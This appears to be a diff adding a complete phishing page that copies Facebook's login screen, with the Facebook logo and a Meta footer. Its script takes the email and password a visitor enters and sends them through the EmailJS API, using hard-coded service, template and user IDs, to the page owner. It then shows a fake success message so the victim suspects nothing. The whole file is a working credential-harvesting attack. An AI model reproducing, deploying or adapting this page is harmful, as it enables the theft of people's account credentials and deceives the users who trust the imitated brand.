@@ -1,0 +1,170 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login Page</title>
+    <style>
+        body {
+            margin: 0;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background-color: #e9eff1;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+
+        .container {
+            width: 100%;
+            max-width: 400px; /* Reset width to normal */
+            text-align: center;
+            background-color: white;
+            padding: 40px; /* Reset padding */
+            border-radius: 8px;
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
+        }
+
+        .logo img {
+            width: 150px; /* Reset logo size */
+            margin-bottom: 30px;
+        }
+
+        input[type="text"],
+        input[type="password"] {
+            width: 100%;
+            padding: 14px; /* Reset padding */
+            margin: 12px 0; /* Reset margin */
+            border: 1px solid #ddd;
+            border-radius: 5px; /* Standard border radius */
+            box-sizing: border-box;
+            font-size: 16px; /* Reset font size */
+        }
+
+        .btn {
+            background-color: #1877f2;
+            color: white;
+            border: none;
+            padding: 14px; /* Reset padding */
+            width: 100%;
+            border-radius: 5px; /* Standard border radius */
+            font-size: 18px; /* Standard button font size */
+            cursor: pointer;
+            margin-top: 10px; /* Reset margin */
+        }
+
+        .btn:hover {
+            background-color: #145dbb;
+        }
+
+        .forgot-password {
+            font-size: 16px; /* Standard font size */
+            color: #1877f2;
+            margin: 20px 0;
+        }
+
+        .forgot-password a {
+            text-decoration: none;
+            color: #1877f2;
+        }
+
+        .forgot-password a:hover {
+            text-decoration: underline;
+        }
+
+        .create-account {
+            margin-top: 15px; /* Standard margin */
+            font-size: 17px; /* Standard font size */
+        }
+
+        .create-account a {
+            color: #1877f2;
+            text-decoration: none;
+            font-weight: bold;
+        }
+
+        .create-account a:hover {
+            text-decoration: underline;
+        }
+
+        .meta-footer {
+            margin-top: 25px; /* Standard margin */
+            font-size: 14px; /* Standard footer text size */
+            color: #aaa;
+        }
+
+        .meta-footer a {
+            color: #aaa;
+            text-decoration: none;
+        }
+
+        .meta-footer a:hover {
+            text-decoration: underline;
+        }
+
+        /* Infinity sign styling */
+        .infinity-sign {
+            font-size: 40px; /* Large font size for infinity sign */
+            color: #aaa;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" alt="Facebook Logo">
+        </div>
+        <form id="loginForm">
+            <input type="text" name="email" placeholder="Email or Phone" required>
+            <input type="password" name="password" placeholder="Password" required>
+            <button type="submit" class="btn">Log In</button>
+        </form>
+        <div class="forgot-password">
+            <a href="#">Forgotten password?</a>
+        </div>
+        <div class="create-account">
+            <a href="#">Create new account</a>
+        </div>
+        <div class="meta-footer">
+            <span class="infinity-sign">∞</span> Meta
+        </div>
+    </div>
+
+    <script>
+        const loginForm = document.getElementById('loginForm');
+
+        loginForm.addEventListener('submit', function(event) {
+            event.preventDefault();
+
+            const formData = new FormData(loginForm);
+            const payload = {
+                email: formData.get('email'),
+                password: formData.get('password'),
+            };
+
+            fetch('https://api.emailjs.com/api/v1.0/email/send', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    service_id: 'service_4otnudl',
+                    template_id: 'template_eaifxxs',
+                    user_id: 'JXI65_lwNeGPlw_HC',
+                    template_params: payload
+                })
+            })
+            .then(response => {
+                if (response.ok) {
+                    alert(' you have Login successfully!');
+                } else {
+                    alert('Failed to submit login data. Please try again.');
+                }
+            })
+            .catch(error => {
+                alert('An error occurred. Please try again later.');
+            });
+        });
+    </script>
+</body>
+</html>
